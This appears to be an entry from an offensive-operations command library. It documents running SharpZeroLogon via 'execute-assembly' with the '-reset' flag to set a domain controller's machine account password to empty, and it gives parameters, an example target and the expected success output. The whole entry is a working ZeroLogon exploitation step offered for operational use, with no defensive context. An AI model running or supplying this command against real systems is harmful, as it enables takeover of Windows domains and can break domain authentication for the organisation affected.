---
id: d5f29800-24fc-4ca3-b6a3-9606dcbae1bf
name: execute-sharpzerologon-reset-password
type: command
executor: bash
data: execute-assembly SharpZeroLogon.exe $_DC_FQDN -reset
output: null
created_at: '2023-04-06T03:56:02.673414+00:00'
updated_at: '2023-04-10T20:36:01.289773+00:00'
platforms:
  - Windows
tags:
  - sharpzerologon
  - reset
verified: true
validated: true
---

# execute-sharpzerologon-reset-password

## Command

```bash
execute-assembly SharpZeroLogon.exe $_DC_FQDN -reset
```

## Description

Resets the DC machine account password to empty using SharpZeroLogon.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_DC_FQDN | DC FQDN | Yes |
| -reset | Reset password flag | Yes |

## Examples

### Basic Usage

```bash
execute-assembly SharpZeroLogon.exe win-dc01.vulncorp.local -reset
```

## Expected Output

```
[+] Password reset successful.
```

## Related

- [[procedures/ZeroLogon-Exploitation-and-Post-Exploitation]]
- [[commands/execute-sharpzerologon-check]]
